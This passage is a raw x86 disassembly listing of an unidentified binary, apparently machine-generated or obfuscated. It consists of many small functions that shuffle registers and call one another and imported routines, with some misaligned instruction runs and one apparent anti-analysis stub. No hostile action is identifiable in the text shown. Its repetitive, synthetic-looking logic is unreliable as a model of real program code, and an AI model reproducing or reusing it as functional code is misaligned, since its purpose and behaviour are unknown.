  4d0787:	call   0x4d1434
  4d078c:	add    esp,0x4
  4d078f:	pop    eax
  4d0790:	add    esp,0x60
  4d0793:	pop    ebp
  4d0794:	ret    
  4d0795:	add    BYTE PTR [eax],al
  4d0797:	add    BYTE PTR [edi-0x1],bl
  4d079a:	adc    eax,0x4d2040
  4d079f:	call   edi
  4d07a1:	add    BYTE PTR [eax],al
  4d07a3:	add    BYTE PTR [ebx-0x1374aa01],cl
  4d07a9:	sub    esp,0x20
  4d07ac:	mov    ecx,0x4d30fc
  4d07b1:	mov    DWORD PTR [ecx-0x10],0x1a
  4d07b8:	push   ecx
  4d07b9:	push   eax
  4d07ba:	push   ebx
  4d07bb:	push   edi
  4d07bc:	call   0x4d10a8
  4d07c1:	add    esp,0xc
  4d07c4:	pop    ecx
  4d07c5:	push   ecx
  4d07c6:	call   0x4d15ec
  4d07cb:	add    esp,0x4
  4d07ce:	pop    ecx
  4d07cf:	push   ecx
  4d07d0:	push   0x0
  4d07d2:	call   0x4d10f0
  4d07d7:	add    esp,0x4
  4d07da:	pop    ecx
  4d07db:	add    esp,0x20
  4d07de:	pop    ebp
  4d07df:	ret    
  4d07e0:	mov    edi,edi
  4d07e2:	push   ebp
  4d07e3:	mov    ebp,esp
  4d07e5:	sub    esp,0x4c
  4d07e8:	mov    eax,0x4d3178
  4d07ed:	mov    ecx,DWORD PTR [ebp-0x18]
  4d07f0:	push   eax
  4d07f1:	push   ecx
  4d07f2:	push   DWORD PTR [eax+0xc4]
  4d07f8:	call   0x4d0f24
  4d07fd:	add    esp,0x8
  4d0800:	pop    eax
  4d0801:	push   eax
  4d0802:	push   0x0
  4d0804:	call   0x4d1434
  4d0809:	add    esp,0x4
  4d080c:	pop    eax
  4d080d:	push   eax
  4d080e:	mov    ebx,0x0
  4d0813:	push   ebx
  4d0814:	call   0x4d0e10
  4d0819:	add    esp,0x4
  4d081c:	pop    eax
  4d081d:	add    esp,0x4c
  4d0820:	pop    ebp
  4d0821:	ret    
  4d0822:	add    BYTE PTR [eax],al
  4d0824:	mov    edi,edi
  4d0826:	push   ebp
  4d0827:	mov    ebp,esp
  4d0829:	sub    esp,0x30
  4d082c:	lea    edx,[eax-0x54]
  4d082f:	adc    esi,0xffffa99a
  4d0835:	push   edx
  4d0836:	mov    ecx,0x0
  4d083b:	push   ecx
  4d083c:	call   0x4d0e10
  4d0841:	add    esp,0x4
  4d0844:	pop    edx
  4d0845:	push   edx
  4d0846:	push   DWORD PTR [edx+0x124]
  4d084c:	push   DWORD PTR [edx+0xbc]
  4d0852:	push   ebx
  4d0853:	push   edi
  4d0854:	call   0x4d0d28
  4d0859:	add    esp,0x10
  4d085c:	pop    edx
  4d085d:	push   edx
  4d085e:	mov    edi,0x0
  4d0863:	push   edi
  4d0864:	call   0x4d1434
  4d0869:	add    esp,0x4
  4d086c:	pop    edx
  4d086d:	add    esp,0x30
  4d0870:	pop    ebp
  4d0871:	ret    
  4d0872:	add    BYTE PTR [eax],al
  4d0874:	pop    edi
  4d0875:	call   DWORD PTR ds:0x4d200c
  4d087b:	call   edi
  4d087d:	add    BYTE PTR [eax],al
  4d087f:	add    BYTE PTR [edi-0x1],bl
  4d0882:	adc    eax,0x4d2000
  4d0887:	call   edi
  4d0889:	add    BYTE PTR [eax],al
  4d088b:	add    BYTE PTR [ebx-0x1374aa01],cl
  4d0891:	sub    esp,0x38
  4d0894:	lea    ecx,[eax-0x1a8]
  4d089a:	sbb    esi,edi
  4d089c:	push   ecx
  4d089d:	push   ebx
  4d089e:	push   eax
  4d089f:	call   0x4d0b74
  4d08a4:	add    esp,0x8
  4d08a7:	pop    ecx
  4d08a8:	push   ecx
  4d08a9:	push   0x0
  4d08ab:	call   0x4d15d4
  4d08b0:	add    esp,0x4
  4d08b3:	pop    ecx
  4d08b4:	push   ecx
  4d08b5:	mov    eax,0x0
  4d08ba:	push   eax
  4d08bb:	call   0x4d0798
  4d08c0:	add    esp,0x4
  4d08c3:	pop    ecx
  4d08c4:	add    esp,0x38
  4d08c7:	pop    ebp
  4d08c8:	ret    
  4d08c9:	add    BYTE PTR [eax],al
  4d08cb:	add    BYTE PTR [edi-0x1],bl
  4d08ce:	adc    eax,0x4d2074
  4d08d3:	call   edi
  4d08d5:	add    BYTE PTR [eax],al
  4d08d7:	add    BYTE PTR [edi-0x1],bl
  4d08da:	adc    eax,0x4d2078
  4d08df:	call   edi
  4d08e1:	add    BYTE PTR [eax],al
  4d08e3:	add    BYTE PTR [ebx-0x1374aa01],cl
  4d08e9:	sub    esp,0x58
  4d08ec:	lea    ebx,[edi-0xa4]
  4d08f2:	xor    DWORD PTR [ebp-0x24],0x64
  4d08f6:	push   ebx
  4d08f7:	push   edx
  4d08f8:	push   DWORD PTR [ebx+0xa0]
  4d08fe:	push   DWORD PTR [ebx+0x12c]
  4d0904:	call   0x4d0754
  4d0909:	add    esp,0xc
  4d090c:	pop    ebx
  4d090d:	call   0x4d1054
  4d0912:	add    esp,0x4
  4d0915:	lea    edx,[ebx-0x68]
  4d0918:	push   edx
  4d0919:	call   0x4d13d4
  4d091e:	add    esp,0x4
  4d0921:	test   eax,eax
  4d0923:	jne    0x4d0916
  4d0925:	add    esp,0x58
  4d0928:	pop    ebp
  4d0929:	ret    
  4d092a:	add    BYTE PTR [eax],al
  4d092c:	mov    edi,edi
  4d092e:	push   ebp
  4d092f:	mov    ebp,esp
  4d0931:	sub    esp,0x40
  4d0934:	lea    edi,ds:0x4d30f8
  4d093a:	cmp    edi,0x4051
  4d0940:	jbe    0x4d092f
  4d0942:	push   edi
  4d0943:	push   ebx
  4d0944:	push   edx
  4d0945:	call   0x4d0b28
  4d094a:	add    esp,0x8
  4d094d:	pop    edi
  4d094e:	push   edi
  4d094f:	call   0x4d1054
  4d0954:	add    esp,0x4
  4d0957:	pop    edi
  4d0958:	push   edi
  4d0959:	push   0x0
  4d095b:	call   0x4d14f4
  4d0960:	add    esp,0x4
  4d0963:	pop    edi
  4d0964:	add    esp,0x40
  4d0967:	pop    ebp
  4d0968:	ret    
  4d0969:	add    BYTE PTR [eax],al
  4d096b:	add    BYTE PTR [ebx-0x1374aa01],cl
  4d0971:	sub    esp,0x5c
  4d0974:	lea    esi,[edi-0x58]
  4d0977:	add    DWORD PTR [ebp-0x44],esi
  4d097a:	push   esi
  4d097b:	push   ebx
  4d097c:	push   DWORD PTR [esi+0x13c]
  4d0982:	push   DWORD PTR [esi+0x148]
  4d0988:	push   DWORD PTR [esi+0xc8]
  4d098e:	call   0x4d1060
  4d0993:	add    esp,0x10
  4d0996:	pop    esi
  4d0997:	push   0x0
  4d0999:	call   0x4d14e8
  4d099e:	add    esp,0x4
  4d09a1:	call   0x4d1054
  4d09a6:	add    esp,0x4
  4d09a9:	add    esp,0x5c
  4d09ac:	pop    ebp
  4d09ad:	ret    
  4d09ae:	add    BYTE PTR [eax],al
  4d09b0:	mov    edi,edi
  4d09b2:	push   ebp
  4d09b3:	mov    ebp,esp
  4d09b5:	sub    esp,0x58
  4d09b8:	lea    esi,ds:0x4d31fc
  4d09be:	add    edx,DWORD PTR [esi-0x1a8]
  4d09c4:	push   esi
  4d09c5:	push   DWORD PTR [esi+0x64]
  4d09c8:	push   edi
  4d09c9:	push   DWORD PTR [esi+0x184]
  4d09cf:	push   DWORD PTR [esi+0x1d8]
  4d09d5:	call   0x4d1584
  4d09da:	add    esp,0x10
  4d09dd:	pop    esi
  4d09de:	push   0x0
  4d09e0:	call   0x4d0f18
  4d09e5:	add    esp,0x4
  4d09e8:	mov    eax,0x0
  4d09ed:	push   eax
  4d09ee:	call   0x4d14e8
  4d09f3:	add    esp,0x4
  4d09f6:	add    esp,0x58
  4d09f9:	pop    ebp
  4d09fa:	ret    
  4d09fb:	add    BYTE PTR [ebx-0x1374aa01],cl
  4d0a01:	sub    esp,0x48
  4d0a04:	lea    edx,ds:0x4d319c
  4d0a0a:	xor    ebx,ecx
  4d0a0c:	push   edx
  4d0a0d:	mov    eax,0x0
  4d0a12:	push   eax
  4d0a13:	call   0x4d0880
  4d0a18:	add    esp,0x4
  4d0a1b:	pop    edx
  4d0a1c:	push   edx
  4d0a1d:	push   edi
  4d0a1e:	push   eax
  4d0a1f:	push   DWORD PTR [edx+0x6c]
  4d0a22:	push   eax
  4d0a23:	call   0x4d092c
  4d0a28:	add    esp,0x10
  4d0a2b:	pop    edx
  4d0a2c:	push   edx
  4d0a2d:	mov    edx,0x0
  4d0a32:	push   edx
  4d0a33:	call   0x4d10f0
  4d0a38:	add    esp,0x4
  4d0a3b:	pop    edx
  4d0a3c:	add    esp,0x48
  4d0a3f:	pop    ebp
  4d0a40:	ret    
  4d0a41:	add    BYTE PTR [eax],al
  4d0a43:	add    BYTE PTR [edi-0x1],bl
  4d0a46:	adc    eax,0x4d209c
  4d0a4b:	call   edi
  4d0a4d:	add    BYTE PTR [eax],al
  4d0a4f:	add    BYTE PTR [edi-0x1],bl
  4d0a52:	adc    eax,0x4d2098
  4d0a57:	call   edi
  4d0a59:	add    BYTE PTR [eax],al
  4d0a5b:	add    BYTE PTR [ebx-0x1374aa01],cl
  4d0a61:	sub    esp,0x34
  4d0a64:	lea    edi,ds:0x4d305c
  4d0a6a:	xor    esi,DWORD PTR [edi+0x3c]
  4d0a6d:	push   edi
  4d0a6e:	push   eax
  4d0a6f:	push   esi
  4d0a70:	push   DWORD PTR [edi+0x74]
  4d0a73:	push   DWORD PTR [edi+0x1b4]
  4d0a79:	call   0x4d09b0
  4d0a7e:	add    esp,0x10
  4d0a81:	pop    edi
  4d0a82:	push   edi
  4d0a83:	mov    eax,0x0
  4d0a88:	push   eax
  4d0a89:	call   0x4d15d4
  4d0a8e:	add    esp,0x4
  4d0a91:	pop    edi
  4d0a92:	push   edi
  4d0a93:	push   0x0
  4d0a95:	call   0x4d14e8
  4d0a9a:	add    esp,0x4
  4d0a9d:	pop    edi
  4d0a9e:	add    esp,0x34
  4d0aa1:	pop    ebp
  4d0aa2:	ret    
  4d0aa3:	add    BYTE PTR [ebx-0x1374aa01],cl
  4d0aa9:	sub    esp,0x40
  4d0aac:	mov    ecx,0x4d3140
  4d0ab1:	add    DWORD PTR [ecx-0xfc],eax
  4d0ab7:	push   ecx
  4d0ab8:	push   DWORD PTR [ecx+0xb0]
  4d0abe:	push   DWORD PTR [ecx+0xcc]
  4d0ac4:	push   eax
  4d0ac5:	call   0x4d0af0
  4d0aca:	add    esp,0xc
  4d0acd:	pop    ecx
  4d0ace:	push   ecx
  4d0acf:	mov    ecx,0x0
  4d0ad4:	push   ecx
  4d0ad5:	call   0x4d0798
  4d0ada:	add    esp,0x4
  4d0add:	pop    ecx
  4d0ade:	push   ecx
  4d0adf:	push   0xfffffff4
  4d0ae1:	call   0x4d1410
  4d0ae6:	add    esp,0x4
  4d0ae9:	pop    ecx
  4d0aea:	add    esp,0x40
  4d0aed:	pop    ebp
  4d0aee:	ret    
  4d0aef:	add    BYTE PTR [ebx-0x1374aa01],cl
  4d0af5:	sub    esp,0x60
  4d0af8:	lea    esi,[ecx-0x8c]
  4d0afe:	mov    DWORD PTR [esi+0x48],esi
  4d0b01:	push   esi
  4d0b02:	push   ebx
  4d0b03:	push   edx
  4d0b04:	call   0x4d11a0
  4d0b09:	add    esp,0x8
  4d0b0c:	pop    esi
  4d0b0d:	call   0x4d13bc
  4d0b12:	add    esp,0x4
  4d0b15:	mov    edi,0x0
  4d0b1a:	push   edi
  4d0b1b:	call   0x4d10f0
  4d0b20:	add    esp,0x4
  4d0b23:	add    esp,0x60
  4d0b26:	pop    ebp
  4d0b27:	ret    
  4d0b28:	mov    edi,edi
  4d0b2a:	push   ebp
  4d0b2b:	mov    ebp,esp
  4d0b2d:	sub    esp,0x48
  4d0b30:	lea    eax,[edi+0x74]
  4d0b33:	adc    DWORD PTR [ebp-0x34],edi
  4d0b36:	push   eax
  4d0b37:	push   edi
  4d0b38:	push   ebx
  4d0b39:	call   0x4d0824
  4d0b3e:	add    esp,0x8
  4d0b41:	pop    eax
  4d0b42:	push   eax
  4d0b43:	mov    ebx,0x0
  4d0b48:	push   ebx
  4d0b49:	call   0x4d0798
  4d0b4e:	add    esp,0x4
  4d0b51:	pop    eax
  4d0b52:	push   eax
  4d0b53:	mov    ecx,0x0
  4d0b58:	push   ecx
  4d0b59:	call   0x4d0f18
  4d0b5e:	add    esp,0x4
  4d0b61:	pop    eax
  4d0b62:	add    esp,0x48
  4d0b65:	pop    ebp
  4d0b66:	ret    
  4d0b67:	add    BYTE PTR [edi-0x1],bl
  4d0b6a:	adc    eax,0x4d20a0
  4d0b6f:	call   edi
  4d0b71:	add    BYTE PTR [eax],al
  4d0b73:	add    BYTE PTR [ebx-0x1374aa01],cl
  4d0b79:	sub    esp,0x40
  4d0b7c:	lea    ebx,ds:0x4d3080
  4d0b82:	and    DWORD PTR [ebx+0x90],edx
  4d0b88:	call   0x4d15ec
  4d0b8d:	add    esp,0x4
  4d0b90:	push   ebx
  4d0b91:	push   DWORD PTR [ebx+0x1e0]
  4d0b97:	push   DWORD PTR [ebx+0x188]
  4d0b9d:	call   0x4d0e34
  4d0ba2:	add    esp,0x8
  4d0ba5:	pop    ebx
  4d0ba6:	lea    esi,[ebx-0x80]
  4d0bac:	push   esi
  4d0bad:	call   0x4d13d4
  4d0bb2:	add    esp,0x4
  4d0bb5:	test   eax,eax
  4d0bb7:	jne    0x4d0ba7
  4d0bb9:	add    esp,0x40
  4d0bbc:	pop    ebp
  4d0bbd:	ret    
  4d0bbe:	add    BYTE PTR [eax],al
  4d0bc0:	pop    edi
  4d0bc1:	call   DWORD PTR ds:0x4d2028
  4d0bc7:	call   edi
  4d0bc9:	add    BYTE PTR [eax],al
  4d0bcb:	add    BYTE PTR [ebx-0x1374aa01],cl
  4d0bd1:	sub    esp,0x48
  4d0bd4:	lea    edx,[ecx+0x17c]
  4d0bda:	cmp    edx,0x96d
  4d0be0:	je     0x4d0bcf
  4d0be2:	push   edx
  4d0be3:	push   DWORD PTR [edx+0x90]
  4d0be9:	push   DWORD PTR [edx+0x150]
  4d0bef:	push   edi
  4d0bf0:	push   edi
  4d0bf1:	call   0x4d0c20
  4d0bf6:	add    esp,0x10
  4d0bf9:	pop    edx
  4d0bfa:	push   edx
  4d0bfb:	call   0x4d1054
  4d0c00:	add    esp,0x4
  4d0c03:	pop    edx
  4d0c04:	push   edx
  4d0c05:	lea    edx,[edx-0x1ac]
  4d0c0b:	push   edx
  4d0c0c:	call   0x4d13d4
  4d0c11:	add    esp,0x4
  4d0c14:	test   eax,eax
  4d0c16:	jne    0x4d0c05
  4d0c18:	pop    edx
  4d0c19:	add    esp,0x48
  4d0c1c:	pop    ebp
  4d0c1d:	ret    
  4d0c1e:	add    BYTE PTR [eax],al
  4d0c20:	mov    edi,edi
  4d0c22:	push   ebp
  4d0c23:	mov    ebp,esp
  4d0c25:	sub    esp,0x5c
  4d0c28:	lea    esi,[edx-0x74]
  4d0c2b:	cmp    esi,0x1113
  4d0c31:	jb     0x4d0c23
  4d0c33:	call   0x4d13bc
  4d0c38:	add    esp,0x4
  4d0c3b:	push   esi
  4d0c3c:	push   DWORD PTR [esi+0x1b0]
  4d0c42:	push   ecx
  4d0c43:	push   DWORD PTR [esi+0x194]
  4d0c49:	call   0x4d0ecc
  4d0c4e:	add    esp,0xc
  4d0c51:	pop    esi
  4d0c52:	push   0x0
  4d0c54:	call   0x4d0880
  4d0c59:	add    esp,0x4
  4d0c5c:	add    esp,0x5c
  4d0c5f:	pop    ebp
  4d0c60:	ret    
  4d0c61:	add    BYTE PTR [eax],al
  4d0c63:	add    BYTE PTR [edi+0x2b],dl
  4d0c66:	call   DWORD PTR [edi+0x57]
  4d0c69:	push   edi
  4d0c6a:	push   edi
  4d0c6b:	call   0x4d15ec
  4d0c70:	sub    esp,0xfffffffc
  4d0c73:	call   0x4d1048
  4d0c78:	push   0x2
  4d0c7a:	xor    eax,eax
  4d0c7c:	sub    eax,0x4d3030
  4d0c81:	neg    eax
  4d0c83:	push   0x0
  4d0c85:	lea    ecx,[eax+0x7]
  4d0c88:	add    BYTE PTR [ecx],0x41
  4d0c8b:	push   eax
  4d0c8c:	call   0x4d0874
  4d0c91:	pop    edi
  4d0c92:	pop    edi
  4d0c93:	pop    edi
  4d0c94:	lea    ecx,[eax+0x3b]
  4d0c97:	mov    edi,DWORD PTR [ecx]
  4d0c99:	lea    eax,[eax+edi*1]
  4d0c9c:	mov    eax,DWORD PTR [eax+0x28]
  4d0c9f:	pusha  
  4d0ca0:	mov    ah,0x45
  4d0ca2:	sub    al,ah
  4d0ca4:	ja     0x4d0710
  4d0caa:	popa   
  4d0cab:	ret    
  4d0cac:	mov    edi,edi
  4d0cae:	push   ebp
  4d0caf:	mov    ebp,esp
  4d0cb1:	sub    esp,0x20
  4d0cb4:	lea    ecx,ds:0x4d3030
  4d0cba:	sbb    edx,DWORD PTR [ebp-0xc]
  4d0cbd:	push   ecx
  4d0cbe:	mov    ecx,0x0
  4d0cc3:	push   ecx
  4d0cc4:	call   0x4d15d4
  4d0cc9:	add    esp,0x4
  4d0ccc:	pop    ecx
  4d0ccd:	push   ecx
  4d0cce:	push   edx
  4d0ccf:	push   edi
  4d0cd0:	call   0x4d0bcc
  4d0cd5:	add    esp,0x8
  4d0cd8:	pop    ecx
  4d0cd9:	push   ecx
  4d0cda:	mov    esi,0x0
  4d0cdf:	push   esi
  4d0ce0:	call   0x4d15d4
  4d0ce5:	add    esp,0x4
  4d0ce8:	pop    ecx
  4d0ce9:	add    esp,0x20
  4d0cec:	pop    ebp
  4d0ced:	ret    
  4d0cee:	add    BYTE PTR [eax],al
  4d0cf0:	mov    edi,edi
  4d0cf2:	push   ebp
  4d0cf3:	mov    ebp,esp
  4d0cf5:	sub    esp,0x44
  4d0cf8:	mov    eax,0x4d305c
  4d0cfd:	sbb    DWORD PTR [eax-0x18],edx
  4d0d00:	push   eax
  4d0d01:	call   0x4d15ec
  4d0d06:	add    esp,0x4
  4d0d09:	pop    eax
  4d0d0a:	push   eax
  4d0d0b:	push   ecx
  4d0d0c:	push   edi
  4d0d0d:	push   edx
  4d0d0e:	call   0x4d0f74
  4d0d13:	add    esp,0xc
  4d0d16:	pop    eax
  4d0d17:	push   eax
  4d0d18:	call   0x4d1054
  4d0d1d:	add    esp,0x4
  4d0d20:	pop    eax
  4d0d21:	add    esp,0x44
  4d0d24:	pop    ebp
  4d0d25:	ret    
  4d0d26:	add    BYTE PTR [eax],al
  4d0d28:	mov    edi,edi
  4d0d2a:	push   ebp
  4d0d2b:	mov    ebp,esp
  4d0d2d:	sub    esp,0x28
  4d0d30:	lea    ecx,ds:0x4d3048
  4d0d36:	sub    DWORD PTR [ebp-0x20],0x17a3
  4d0d3d:	push   ecx
  4d0d3e:	push   DWORD PTR [ecx+0x9c]
  4d0d44:	push   DWORD PTR [ecx+0xe8]
  4d0d4a:	push   edx
  4d0d4b:	push   eax
  4d0d4c:	call   0x4d0dc4
  4d0d51:	add    esp,0x10
  4d0d54:	pop    ecx
  4d0d55:	push   ecx
  4d0d56:	mov    ebx,0x0
  4d0d5b:	push   ebx
  4d0d5c:	call   0x4d13f8
  4d0d61:	add    esp,0x4
  4d0d64:	pop    ecx
  4d0d65:	push   ecx
  4d0d66:	push   0x0
  4d0d68:	call   0x4d0798
  4d0d6d:	add    esp,0x4
  4d0d70:	pop    ecx
  4d0d71:	add    esp,0x28
  4d0d74:	pop    ebp
  4d0d75:	ret    
  4d0d76:	add    BYTE PTR [eax],al
  4d0d78:	mov    edi,edi
  4d0d7a:	push   ebp
  4d0d7b:	mov    ebp,esp
  4d0d7d:	sub    esp,0x54
  4d0d80:	lea    edx,ds:0x4d31ec
  4d0d86:	mov    ecx,DWORD PTR [ebp-0x10]
  4d0d89:	push   edx
  4d0d8a:	lea    ecx,[edx-0x1ec]
  4d0d90:	push   ecx
  4d0d91:	call   0x4d13d4
  4d0d96:	add    esp,0x4
  4d0d99:	test   eax,eax
  4d0d9b:	jne    0x4d0d8a
  4d0d9d:	pop    edx
  4d0d9e:	push   edx
  4d0d9f:	push   DWORD PTR [edx+0x13c]
  4d0da5:	push   edi
  4d0da6:	call   0x4d0e84
  4d0dab:	add    esp,0x8
  4d0dae:	pop    edx
  4d0daf:	push   edx
  4d0db0:	mov    edx,0x0
  4d0db5:	push   edx
  4d0db6:	call   0x4d1434
  4d0dbb:	add    esp,0x4
  4d0dbe:	pop    edx
  4d0dbf:	add    esp,0x54
  4d0dc2:	pop    ebp
  4d0dc3:	ret    
  4d0dc4:	mov    edi,edi
  4d0dc6:	push   ebp
  4d0dc7:	mov    ebp,esp
  4d0dc9:	sub    esp,0x44
  4d0dcc:	lea    edx,ds:0x4d3128
  4d0dd2:	cmp    edx,0x25dc
  4d0dd8:	jb     0x4d0dc7
  4d0dda:	push   edx
  4d0ddb:	push   DWORD PTR [edx+0x124]
  4d0de1:	push   edi
  4d0de2:	push   ebx
  4d0de3:	push   DWORD PTR [edx+0x1e8]
  4d0de9:	call   0x4d0a5c
  4d0dee:	add    esp,0x10
  4d0df1:	pop    edx
  4d0df2:	push   edx
  4d0df3:	push   0x0
  4d0df5:	call   0x4d1434
  4d0dfa:	add    esp,0x4
  4d0dfd:	pop    edx
  4d0dfe:	push   edx
  4d0dff:	push   0x0
  4d0e01:	call   0x4d10f0
  4d0e06:	add    esp,0x4
  4d0e09:	pop    edx
  4d0e0a:	add    esp,0x44
  4d0e0d:	pop    ebp
  4d0e0e:	ret    
  4d0e0f:	add    BYTE PTR [edi-0x1],bl
  4d0e12:	adc    eax,0x4d2010
  4d0e17:	call   edi
  4d0e19:	add    BYTE PTR [eax],al
  4d0e1b:	add    BYTE PTR [edi-0x1],bl
  4d0e1e:	adc    eax,0x4d2044
  4d0e23:	call   edi
  4d0e25:	add    BYTE PTR [eax],al
  4d0e27:	add    BYTE PTR [edi-0x1],bl
  4d0e2a:	adc    eax,0x4d2060
  4d0e2f:	call   edi
  4d0e31:	add    BYTE PTR [eax],al
  4d0e33:	add    BYTE PTR [ebx-0x1374aa01],cl
  4d0e39:	sub    esp,0x58
  4d0e3c:	mov    eax,0x4d31ac
  4d0e41:	xor    DWORD PTR [ebp-0x40],ebx
  4d0e44:	push   eax
  4d0e45:	push   ecx
  4d0e46:	push   DWORD PTR [eax+0x144]
  4d0e4c:	push   esi
  4d0e4d:	push   DWORD PTR [eax+0x110]
  4d0e53:	call   0x4d1374
  4d0e58:	add    esp,0x10
  4d0e5b:	pop    eax
  4d0e5c:	push   eax
  4d0e5d:	mov    esi,0x0
  4d0e62:	push   esi
  4d0e63:	call   0x4d13f8
  4d0e68:	add    esp,0x4
  4d0e6b:	pop    eax
  4d0e6c:	push   eax
  4d0e6d:	mov    esi,0x0
  4d0e72:	push   esi
  4d0e73:	call   0x4d0f18
  4d0e78:	add    esp,0x4
  4d0e7b:	pop    eax
  4d0e7c:	add    esp,0x58
  4d0e7f:	pop    ebp
  4d0e80:	ret    
  4d0e81:	add    BYTE PTR [eax],al
  4d0e83:	add    BYTE PTR [ebx-0x1374aa01],cl
  4d0e89:	sub    esp,0x28
  4d0e8c:	mov    eax,0x4d31f4
  4d0e91:	or     DWORD PTR [eax-0x50],0x4a
  4d0e95:	push   eax
  4d0e96:	mov    ecx,0x0
  4d0e9b:	push   ecx
  4d0e9c:	call   0x4d0e10
  4d0ea1:	add    esp,0x4
  4d0ea4:	pop    eax
  4d0ea5:	push   eax
  4d0ea6:	push   DWORD PTR [eax+0x1cc]
  4d0eac:	push   DWORD PTR [eax+0x1d8]
  4d0eb2:	push   ecx
  4d0eb3:	call   0x4d07a4
  4d0eb8:	add    esp,0xc
  4d0ebb:	pop    eax
  4d0ebc:	push   eax
  4d0ebd:	call   0x4d13bc
  4d0ec2:	add    esp,0x4
  4d0ec5:	pop    eax
  4d0ec6:	add    esp,0x28
  4d0ec9:	pop    ebp
  4d0eca:	ret    
  4d0ecb:	add    BYTE PTR [ebx-0x1374aa01],cl
  4d0ed1:	sub    esp,0x58
  4d0ed4:	lea    eax,ds:0x4d30c4
  4d0eda:	adc    ecx,DWORD PTR [eax+0xac]
  4d0ee0:	push   eax
  4d0ee1:	push   ecx
  4d0ee2:	push   ecx
  4d0ee3:	call   0x4d09fc
  4d0ee8:	add    esp,0x8
  4d0eeb:	pop    eax
  4d0eec:	push   eax
  4d0eed:	mov    esi,0x0
  4d0ef2:	push   esi
  4d0ef3:	call   0x4d10f0
  4d0ef8:	add    esp,0x4
  4d0efb:	pop    eax
  4d0efc:	push   eax
  4d0efd:	lea    esi,[eax-0xc4]
  4d0f03:	push   esi
  4d0f04:	call   0x4d13d4
  4d0f09:	add    esp,0x4
  4d0f0c:	test   eax,eax
  4d0f0e:	jne    0x4d0efd
  4d0f10:	pop    eax
  4d0f11:	add    esp,0x58
  4d0f14:	pop    ebp
  4d0f15:	ret    
  4d0f16:	add    BYTE PTR [eax],al
  4d0f18:	pop    edi
  4d0f19:	call   DWORD PTR ds:0x4d2004
  4d0f1f:	call   edi
  4d0f21:	add    BYTE PTR [eax],al
  4d0f23:	add    BYTE PTR [ebx-0x1374aa01],cl
  4d0f29:	sub    esp,0x28
  4d0f2c:	lea    edi,[eax-0x108]
  4d0f32:	xor    eax,ecx
  4d0f34:	push   edi
  4d0f35:	push   DWORD PTR [edi+0x124]
  4d0f3b:	push   DWORD PTR [edi+0x48]
  4d0f3e:	call   0x4d096c
  4d0f43:	add    esp,0x8
  4d0f46:	pop    edi
  4d0f47:	push   edi
  4d0f48:	mov    eax,0x0
  4d0f4d:	push   eax
  4d0f4e:	call   0x4d0f18
  4d0f53:	add    esp,0x4
  4d0f56:	pop    edi
  4d0f57:	push   edi
  4d0f58:	call   0x4d13bc
  4d0f5d:	add    esp,0x4
  4d0f60:	pop    edi
  4d0f61:	add    esp,0x28
  4d0f64:	pop    ebp
  4d0f65:	ret    
  4d0f66:	add    BYTE PTR [eax],al
  4d0f68:	pop    edi
  4d0f69:	call   DWORD PTR ds:0x4d2094
  4d0f6f:	call   edi
  4d0f71:	add    BYTE PTR [eax],al
  4d0f73:	add    BYTE PTR [ebx-0x1374aa01],cl
  4d0f79:	sub    esp,0x40
  4d0f7c:	lea    edx,[eax+0x1c]
  4d0f7f:	mov    DWORD PTR [edx-0x6c],ebx
  4d0f82:	push   edx
  4d0f83:	push   0x0
  4d0f85:	call   0x4d0798
  4d0f8a:	add    esp,0x4
  4d0f8d:	pop    edx
  4d0f8e:	push   edx
  4d0f8f:	push   DWORD PTR [edx+0xc]
  4d0f92:	push   eax
  4d0f93:	call   0x4d1500
  4d0f98:	add    esp,0x8
  4d0f9b:	pop    edx
  4d0f9c:	push   edx
  4d0f9d:	push   0xfffffff4
  4d0f9f:	call   0x4d1410
  4d0fa4:	add    esp,0x4
  4d0fa7:	pop    edx
  4d0fa8:	add    esp,0x40
  4d0fab:	pop    ebp
  4d0fac:	ret    
  4d0fad:	add    BYTE PTR [eax],al
  4d0faf:	add    BYTE PTR [edi-0x1],bl
  4d0fb2:	adc    eax,0x4d2064
  4d0fb7:	call   edi
  4d0fb9:	add    BYTE PTR [eax],al
  4d0fbb:	add    BYTE PTR [ebx-0x1374aa01],cl
  4d0fc1:	sub    esp,0x2c
  4d0fc4:	mov    ecx,0x4d3168
  4d0fc9:	and    DWORD PTR [ebp-0xc],esi
  4d0fcc:	push   ecx
  4d0fcd:	push   edi
  4d0fce:	push   DWORD PTR [ecx+0x1f0]
  4d0fd4:	push   edx
  4d0fd5:	push   DWORD PTR [ecx+0x16c]
  4d0fdb:	call   0x4d14a8
  4d0fe0:	add    esp,0x10
  4d0fe3:	pop    ecx
  4d0fe4:	push   ecx
  4d0fe5:	call   0x4d15ec
  4d0fea:	add    esp,0x4
  4d0fed:	pop    ecx
  4d0fee:	push   ecx
  4d0fef:	call   0x4d15ec
  4d0ff4:	add    esp,0x4
  4d0ff7:	pop    ecx
  4d0ff8:	add    esp,0x2c
  4d0ffb:	pop    ebp
  4d0ffc:	ret    
  4d0ffd:	add    BYTE PTR [eax],al
  4d0fff:	add    BYTE PTR [ebx-0x1374aa01],cl
  4d1005:	sub    esp,0x34
  4d1008:	lea    ebx,[eax+0x48]
  4d100b:	adc    ecx,DWORD PTR [ebx-0x38]
  4d100e:	mov    eax,0x0
  4d1013:	push   eax
  4d1014:	call   0x4d14e8
  4d1019:	add    esp,0x4
  4d101c:	push   ebx
  4d101d:	push   ecx
  4d101e:	push   edi
  4d101f:	push   DWORD PTR [ebx+0x1b8]
  4d1025:	push   DWORD PTR [ebx+0x180]
  4d102b:	call   0x4d10fc
  4d1030:	add    esp,0x10
  4d1033:	pop    ebx
  4d1034:	mov    esi,0x0
  4d1039:	push   esi
  4d103a:	call   0x4d15d4
  4d103f:	add    esp,0x4
  4d1042:	add    esp,0x34
  4d1045:	pop    ebp
  4d1046:	ret    
  4d1047:	add    BYTE PTR [edi-0x1],bl
  4d104a:	adc    eax,0x4d2024
  4d104f:	call   edi
  4d1051:	add    BYTE PTR [eax],al
  4d1053:	add    BYTE PTR [edi-0x1],bl
  4d1056:	adc    eax,0x4d2018
  4d105b:	call   edi
  4d105d:	add    BYTE PTR [eax],al
  4d105f:	add    BYTE PTR [ebx-0x1374aa01],cl
  4d1065:	sub    esp,0x34
  4d1068:	mov    edi,0x4d31d4
  4d106d:	cmp    edi,0x7e54
  4d1073:	jbe    0x4d1063
  4d1075:	push   edi
  4d1076:	push   ebx
  4d1077:	push   edx
  4d1078:	call   0x4d0d78
  4d107d:	add    esp,0x8
  4d1080:	pop    edi
  4d1081:	push   edi
  4d1082:	push   0x0
  4d1084:	call   0x4d0880
  4d1089:	add    esp,0x4
  4d108c:	pop    edi
  4d108d:	push   edi
